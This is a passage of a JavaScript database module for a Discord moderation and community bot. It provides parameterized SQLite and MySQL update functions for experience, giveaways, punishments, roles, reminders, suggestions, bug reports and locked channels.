                                module.exports.mysql.database.query('INSERT INTO weeklycoinscooldown(user, guild, date) VALUES(?,?,?)', [user.id, user.guild.id, date], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        experience: {
            updateExperience(user, level, xp, action) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild].some(t => !t) || isNaN(level) || isNaN(xp)) return reject('Invalid parameters in updateExperience');

                    if (module.exports.type === 'sqlite') {
                        const experience = module.exports.sqlite.database.prepare('SELECT * FROM experience WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        let newxp;
                        if (experience) {
                            if (action == 'add') newxp = experience.xp + xp;
                            if (action == 'remove') newxp = experience.xp - xp;
                            if (action == 'set') newxp = xp;
                            if (newxp < 0) newxp = 0;
                            if (level < 1) level = 1;

                            module.exports.sqlite.database.prepare('UPDATE experience SET level=?, xp=? WHERE user=? AND guild=?').run(level, newxp, user.id, user.guild.id);
                            resolve();
                        } else {
                            if (['add', 'set'].includes(action)) newxp = xp;
                            if (action == 'remove') newxp = 0;
                            if (newxp < 0) newxp = 0;
                            if (level < 1) level = 1;

                            module.exports.sqlite.database.prepare('INSERT INTO experience(user, guild, level, xp) VALUES(?, ?, ?, ?)').run(user.id, user.guild.id, level, newxp);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM experience WHERE user=? AND guild=?', [user.id, user.guild.id], (err, experience) => {
                            if (err) reject(err);
                            let newxp;
                            if (experience.length > 0) {
                                if (action == 'add') newxp = experience[0].xp + xp;
                                if (action == 'remove') newxp = experience[0].xp - xp;
                                if (action == 'set') newxp = xp;
                                if (newxp < 0) newxp = 0;
                                if (level < 1) level = 1;

                                module.exports.mysql.database.query('UPDATE experience SET level=?, xp=? WHERE user=? AND guild=?', [level, newxp, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                if (['add', 'set'].includes(action)) newxp = xp;
                                if (action == 'remove') newxp = 0 - xp;
                                if (newxp < 0) newxp = 0;
                                if (level < 1) level = 1;

                                module.exports.mysql.database.query('INSERT INTO experience(user, guild, level, xp) VALUES(?, ?, ?, ?)', [user.id, user.guild.id, level, newxp], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        filter: {
            addWord(words) {
                return new Promise((resolve, reject) => {
                    if (!Array.isArray(words)) words = [words];
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare(`INSERT INTO filter(word) VALUES ${words.map(() => `(?)`)}`).run(...words);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query(`INSERT INTO filter(word) VALUES ${words.map(() => `(?)`)}`, words, (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            removeWord(words) {
                return new Promise((resolve, reject) => {
                    if (!Array.isArray(words)) words = [words];
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare(`DELETE FROM filter WHERE ${words.map(() => `word=?`).join(" OR ")}`).run(words);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query(`DELETE FROM filter WHERE ${words.map(() => `word=?`).join(" OR ")}`, words, (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            }
        },
        giveaways: {
            addGiveaway(data) {
                return new Promise((resolve, reject) => {
                    if (['guild', 'channel', 'message', 'prize', 'start', 'end', 'amount_of_winners', 'host'].some(d => !data[d]) || ['start', 'end', 'amount_of_winners'].some(d => isNaN(data[d]))) return reject("Invalid data.");

                    if (module.exports.type == 'sqlite') {
                        module.exports.sqlite.database.prepare('INSERT INTO giveaways(guild, channel, message, prize, description, start, end, amount_of_winners, host, requirements, ended, winners) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
                            .run(data.guild, data.channel.id, data.message, data.prize, data.description, data.start, data.end, data.amount_of_winners, data.host.user.id, data.requirements ? JSON.stringify(data.requirements) : "{}", 0, "[]");
                        resolve();
                    }

                    if (module.exports.type == 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO giveaways(guild, channel, message, prize, description, start, end, amount_of_winners, host, requirements, ended, winners) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
                            [data.guild, data.channel.id, data.message, data.prize, data.description, data.start, data.end, data.amount_of_winners, data.host.user.id, data.requirements ? JSON.stringify(data.requirements) : "{}", false, "[]"], err => {
                                if (err) console.log(err);
                                resolve();
                            });
                    }
                });
            },
            deleteGiveaway(id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM giveaways WHERE message=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM giveaways WHERE message=?', [id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            setToEnded(id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE giveaways SET ended=? WHERE message=?').run(1, id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE giveaways SET ended=? WHERE message=?', [true, id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            setWinners(winners, id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE giveaways SET winners=? WHERE message=?').run(winners, id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE giveaways SET winners=? WHERE message=?', [winners, id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            reactions: {
                addReaction(giveaway, user, entries = 1) {
                    return new Promise((resolve, reject) => {
                        if (!giveaway || !user) return reject('Invalid giveaway or user.');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('INSERT INTO giveawayreactions(giveaway, user, entries) VALUES(?, ?, ?)').run(giveaway, user, entries);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('INSERT INTO giveawayreactions(giveaway, user, entries) VALUES(?, ?, ?)', [giveaway, user, entries], (err) => {
                                if (err) reject(err);
                                resolve();
                            });
                        }
                    });
                },
                removeReaction(giveaway, user) {
                    return new Promise((resolve, reject) => {
                        if (!giveaway || !user) return reject('Invalid giveaway or user.');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('DELETE FROM giveawayreactions WHERE giveaway=? AND user=?').run(giveaway, user);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('DELETE FROM giveawayreactions WHERE giveaway=? AND user=?', [giveaway, user], (err) => {
                                if (err) reject(err);
                                resolve();
                            });
                        }
                    });
                }
            }
        },
        punishments: {
            addPunishment(data) {
                return new Promise((resolve, reject) => {
                    if (['type', 'user', 'tag', 'reason', 'time', 'executor'].some(a => !data[a])) return reject('Invalid arguments for addPunishment');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('INSERT INTO punishments(type, user, tag, reason, time, executor, length, complete) VALUES(?, ?, ?, ?, ?, ?, ?, ?)').run(data.type, data.user, data.tag, data.reason, data.time, data.executor, data.length, 0);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO punishments(type, user, tag, reason, time, executor, length, complete) VALUES(?, ?, ?, ?, ?, ?, ?, ?)', [data.type, data.user, data.tag, data.reason, data.time, data.executor, data.length, 0], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            removePunishment(id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM punishments WHERE id=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM punishments WHERE id=?', [id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            addWarning(data) {
                return new Promise((resolve, reject) => {
                    if (['user', 'tag', 'reason', 'time', 'executor'].some(a => !data[a])) return reject('Invalid arguments for addWarning');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('INSERT INTO warnings(user, tag, reason, time, executor) VALUES(?, ?, ?, ?, ?)').run(data.user, data.tag, data.reason, data.time, data.executor);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO warnings(user, tag, reason, time, executor) VALUES(?, ?, ?, ?, ?)', [data.user, data.tag, data.reason, data.time, data.executor], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            removeWarning(id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM warnings WHERE id=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM warnings WHERE id=?', [id], (err) => {
                            if (err) reject(err);
                            else resolve(err);
                        });
                    }
                });
            },
            completePunishment(id) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE punishments SET complete=1 WHERE id=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE punishments SET complete=1 WHERE id=?', [id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        modules: {
            setModule(modulename, enabled) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE modules SET enabled=? WHERE name=?').run(enabled ? 1 : 0, modulename);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE modules SET enabled=? WHERE name=?', [enabled, modulename], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        commands: {
            setCommand(commandname, enabled) {
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE commands SET enabled=? WHERE name=?').run(enabled ? 1 : 0, commandname);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE commands SET enabled=? WHERE name=?', [enabled, commandname], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            channels: {
                add(data) {
                    return new Promise((resolve, reject) => {
                        if (!data || !data.command || !data.type || !data.channels) return reject('[DATABASE (update.commands.channels.add)] Invalid inputs');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('INSERT INTO command_channels VALUES(?, ?, ?)').run(data.command, data.type, JSON.stringify(data.channels));
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('INSERT INTO command_channels VALUES(?, ?, ?)', [data.command, data.type, JSON.stringify(data.channels)], (err) => {
                                if (err) reject(err);
                                else resolve();
                            });
                        }
                    });
                },
                remove(command) {
                    return new Promise((resolve, reject) => {
                        if (!command) return reject('[DATABASE (update.commands.channels.add)] Invalid inputs');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('DELETE FROM command_channels WHERE command=?').run(command);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('DELETE FROM command_channels WHERE command=?', [command], (err) => {
                                if (err) reject(err);
                                else resolve();
                            });
                        }
                    });
                },
                updateType(command, type) {
                    return new Promise((resolve, reject) => {
                        if (!command || !type) return reject('[DATABASE (update.commands.channels.updateType)] Invalid inputs');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('UPDATE command_channels SET type=? WHERE command=?').run(type, command);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('UPDATE command_channels SET type=? WHERE command=?', [type, command], (err) => {
                                if (err) reject(err);
                                else resolve();
                            });
                        }
                    });
                },
                updateChannels(command, channels) {
                    return new Promise((resolve, reject) => {
                        if (!command || !channels) return reject('[DATABASE (update.commands.channels.updateChannels)] Invalid inputs');

                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('UPDATE command_channels SET channels=? WHERE command=?').run(JSON.stringify(channels), command);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('UPDATE command_channels SET channels=? WHERE command=?', [JSON.stringify(channels), command], (err) => {
                                if (err) reject(err);
                                else resolve();
                            });
                        }
                    });
                }
            }
        },
        applications: {
            createApplication(data) {
                if (Object.values(data).some(a => !a)) return console.log('[DATABASE (update.applications.createApplication] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('INSERT INTO applications(guild, channel_id, channel_name, creator, status) VALUES(?, ?, ?, ?, ?)').run(data.guild, data.channel_id, data.channel_name, data.creator, "Pending");
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO applications(guild, channel_id, channel_name, creator, status, _rank, questions_answers) VALUES(?, ?, ?, ?, ?, ?, ?)', [data.guild, data.channel_id, data.channel_name, data.creator, "Pending", " ", " "], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            completeApplication(id, rank, questions_answers) {
                if (!id || !rank || !questions_answers) return console.log('[DATABASE (update.applications.createApplication] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE applications SET rank=?, questions_answers=? WHERE channel_id=?').run(rank, questions_answers, id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE applications SET _rank=?, questions_answers=? WHERE channel_id=?', [rank, questions_answers, id], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            setStatus(id, status) {
                if (!id || !status) return console.log('[DATABASE (update.applications.setStatus)] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE applications SET status=? WHERE channel_id=?').run(status, id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE applications SET status=? WHERE channel_id=?', [status, id], function (err) {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            }
        },
        roles: {
            setSavedRoles(user, roles) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !user.id || !user.guild || !roles || typeof roles !== 'string') return reject('[DATABASE (update.roles.setSavedRoles)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const savedRoles = module.exports.sqlite.database.prepare('SELECT * FROM saved_roles WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!savedRoles) {
                            module.exports.sqlite.database.prepare('INSERT INTO saved_roles(user, guild, roles) VALUES(?, ?, ?)').run(user.id, user.guild.id, roles);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE saved_roles SET roles=? WHERE user=? AND guild=?').run(roles, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_roles WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO saved_roles(user, guild, roles) VALUES(?, ?, ?)', [user.id, user.guild.id, roles], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE saved_roles SET roles=? WHERE user=? AND guild=?', [roles, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            setSavedMuteRoles(user, roles) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !user.id || !user.guild || !roles || typeof roles !== 'string') return reject('[DATABASE (update.roles.setSavedMuteRoles)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const savedRoles = module.exports.sqlite.database.prepare('SELECT * FROM saved_mute_roles WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!savedRoles) {
                            module.exports.sqlite.database.prepare('INSERT INTO saved_mute_roles(user, guild, roles) VALUES(?, ?, ?)').run(user.id, user.guild.id, roles);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE saved_mute_roles SET roles=? WHERE user=? AND guild=?').run(roles, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_mute_roles WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO saved_mute_roles(user, guild, roles) VALUES(?, ?, ?)', [user.id, user.guild.id, roles], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE saved_mute_roles SET roles=? WHERE user=? AND guild=?', [roles, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        games: {
            setData(user, data) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !user.id || !user.guild || !data || typeof data !== 'string') return reject('[DATABASE (update.games.setData)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const gameData = module.exports.sqlite.database.prepare('SELECT * FROM game_data WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!gameData) {
                            module.exports.sqlite.database.prepare('INSERT INTO game_data(user, guild, data) VALUES(?, ?, ?)').run(user.id, user.guild.id, data);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE game_data SET data=? WHERE user=? AND guild=?').run(data, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM game_data WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO game_data(user, guild, data) VALUES(?, ?, ?)', [user.id, user.guild.id, data], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE game_data SET data=? WHERE user=? AND guild=?', [data, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        addons: {
            setUnloaded(addon_name) {
                return new Promise(async (resolve, reject) => {
                    if (!addon_name) return reject('[DATABASE (update.addons.setUnloaded)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare("INSERT INTO unloaded_addons(addon_name) VALUES(?)").run(addon_name);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO unloaded_addons(addon_name) VALUES(?)', [addon_name], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            setLoaded(addon_name) {
                return new Promise(async (resolve, reject) => {
                    if (!addon_name) return reject('[DATABASE (update.addons.setLoaded)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare("DELETE FROM unloaded_addons WHERE addon_name=?").run(addon_name);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM unloaded_addons WHERE addon_name=?', [addon_name], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            }
        },
        blacklists: {
            addBlacklist(user, command) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !command) return reject('[DATABASE (update.blacklists.addBlacklist)] Invalid inputs');
                    let blacklists = await module.exports.get.getBlacklists(user);

                    if (!blacklists) {
                        if (module.exports.type == "sqlite") module.exports.sqlite.database.prepare("INSERT INTO blacklists VALUES(?, ?, ?)").run(user.id, user.guild.id, " ");
                        if (module.exports.type == "mysql") await module.exports.mysql.database.query("INSERT INTO blacklists VALUES(?, ?, ?)", [user.id, user.guild.id, " "], (err) => {
                            if (err) reject(err);
                        });
                        blacklists = [];
                    }

                    blacklists.push(command);

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("UPDATE blacklists SET commands=? WHERE user=? AND guild=?").run(JSON.stringify(blacklists), user.id, user.guild.id);
                        resolve();
                    }
                    if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("UPDATE blacklists SET commands=? WHERE user=? AND guild=?", [JSON.stringify(blacklists), user.id, user.guild.id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            removeBlacklist(user, command) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !command) return reject('[DATABASE (update.blacklists.removeBlacklist)] Invalid inputs');
                    let blacklists = await module.exports.get.getBlacklists(user);

                    if (!blacklists) blacklists = [];

                    if (blacklists.indexOf(command) >= 0) blacklists.splice(blacklists.indexOf(command), 1);

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("UPDATE blacklists SET commands=? WHERE user=? AND guild=?").run(JSON.stringify(blacklists), user.id, user.guild.id);
                        resolve();
                    }
                    if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("UPDATE blacklists SET commands=? WHERE user=? AND guild=?", [JSON.stringify(blacklists), user.id, user.guild.id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        id_bans: {
            add(guild, id, executor, reason) {
                return new Promise(async (resolve, reject) => {
                    if (!id || !guild || !executor) return reject('[DATABASE (update.id_bans.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO id_bans(guild, id, executor, reason) VALUES(?, ?, ?, ?)").run(guild.id, id, executor.id, reason ? reason : null);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO id_bans(guild, id, executor, reason) VALUES(?, ?, ?, ?)", [guild.id, id, executor.id, reason ? reason : null], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            remove(guild, id) {
                return new Promise(async (resolve, reject) => {
                    if (!id || !guild) return reject('[DATABASE (update.id_bans.remove)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("DELETE FROM id_bans WHERE guild=? AND id=?").run(guild.id, id);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("DELETE FROM id_bans WHERE guild=? AND id=?", [guild.id, id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        reminders: {
            add(member, time, text) {
                return new Promise(async (resolve, reject) => {
                    if (!member || !time || !text) return reject('[DATABASE (update.reminders.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO reminders(member, time, reminder) VALUES(?, ?, ?)").run(member.user.id, time, text);
                        let reminders = await module.exports.get.getReminders();
                        resolve(Math.max(...reminders.map(r => r.id)));
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO reminders(member, time, reminder) VALUES(?, ?, ?)", [member.user.id, time, text], async (err) => {
                            if (err) reject(err);
                            else {
                                let reminders = await module.exports.get.getReminders();
                                resolve(Math.max(...reminders.map(r => r.id)));
                            }
                        });
                    }
                });
            },
            remove(id) {
                return new Promise(async (resolve, reject) => {
                    if (!id) return reject('[DATABASE (update.reminders.remove)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("DELETE FROM reminders WHERE id=?").run(id);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("DELETE FROM reminders WHERE id=?", [id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        announcements: {
            add(announcement) {
                return new Promise(async (resolve, reject) => {
                    if (["Channel", "Interval", "Type"].some(property => !announcement[property]) || (!announcement.Embed && !announcement.Content)) return reject('[DATABASE (update.announcements.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO announcements(announcement_data) VALUES(?)").run(JSON.stringify(announcement));
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO announcements(announcement_data) VALUES(?)", [JSON.stringify(announcement)], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            remove(id) {
                if (!id) return console.log('[DATABASE (update.announcements.remove)] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM announcements WHERE id=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM announcements WHERE id=?', [id], function (err) {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            setNextBroadcast(id, date) {
                if (!id || !date) return console.log('[DATABASE (update.announcements.setNextBroadcast)] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE announcements SET next_broadcast=? WHERE id=?').run(date, id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE announcements SET next_broadcast=? WHERE id=?', [date, id], function (err) {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            }
        },
        suggestions: {
            add(data) {
                return new Promise(async (resolve, reject) => {
                    if (["guild", "channel", "message", "suggestion", "creator", "status", "votes", "created_on"].some(p => !data[p])) return reject('[DATABASE (update.suggestions.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO suggestions(guild, channel, message, suggestion, creator, status, votes, created_on, image) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)").run(...Object.values(data));
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO suggestions(guild, channel, message, suggestion, creator, status, votes, created_on, image) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)", Object.values(data), async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            setStatus(channel, message, status, votes, changedBy, old_message) {
                return new Promise(async (resolve, reject) => {
                    if (!channel || !message || !status || !votes || !changedBy || !old_message) return reject('[DATABASE (update.suggestions.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("UPDATE suggestions SET channel=?, message=?, status=?, status_changed_on=?, votes=?, status_changed_by=? WHERE message=?").run(channel, message, status, Date.now(), JSON.stringify(votes), changedBy, old_message);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("UPDATE suggestions SET channel=?, message=?, status=?, status_changed_on=?, votes=?, status_changed_by=? WHERE message=?", [channel, message, status, Date.now(), JSON.stringify(votes), changedBy, old_message], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        bugreports: {
            // guild text, channel text, message text, suggestion text, creator text, status text, votes text, created_on integer, status_changed_on integer
            add(data) {
                return new Promise(async (resolve, reject) => {
                    if (["guild", "channel", "message", "bug", "creator", "status", "created_on"].some(p => !data[p])) return reject('[DATABASE (update.bugreports.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO bugreports(guild, channel, message, bug, creator, status, created_on, image) VALUES(?, ?, ?, ?, ?, ?, ?, ?)").run(...Object.values(data));
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO bugreports(guild, channel, message, bug, creator, status, created_on, image) VALUES(?, ?, ?, ?, ?, ?, ?, ?)", Object.values(data), async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            setStatus(channel, message, status, changedBy, old_message) {
                return new Promise(async (resolve, reject) => {
                    if (!channel || !message || !status || !changedBy || !old_message) return reject('[DATABASE (update.bugreports.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("UPDATE bugreports SET channel=?, message=?, status=?, status_changed_on=?, status_changed_by=? WHERE message=?").run(channel, message, status, Date.now(), changedBy, old_message);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("UPDATE bugreports SET channel=?, message=?, status=?, status_changed_on=?, status_changed_by=? WHERE message=?", [channel, message, status, Date.now(), changedBy, old_message], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        locked_channels: {
            add(guild, channel, permissions) {
                return new Promise(async (resolve, reject) => {
                    if (!guild || !channel || !permissions) return reject('[DATABASE (update.locked_channels.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO locked_channels(guild, channel, permissions) VALUES(?, ?, ?)").run(guild, channel, JSON.stringify(permissions));
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO locked_channels(guild, channel, permissions) VALUES(?, ?, ?)", [guild, channel, JSON.stringify(permissions)], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            remove(guild, channel) {
                return new Promise(async (resolve, reject) => {
                    if (!guild || !channel) return reject('[DATABASE (update.locked_channels.remove)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("DELETE FROM locked_channels WHERE guild=? AND channel=?").run(guild, channel);
                        resolve();
                    } else if (module.exports.type == "mysql") {
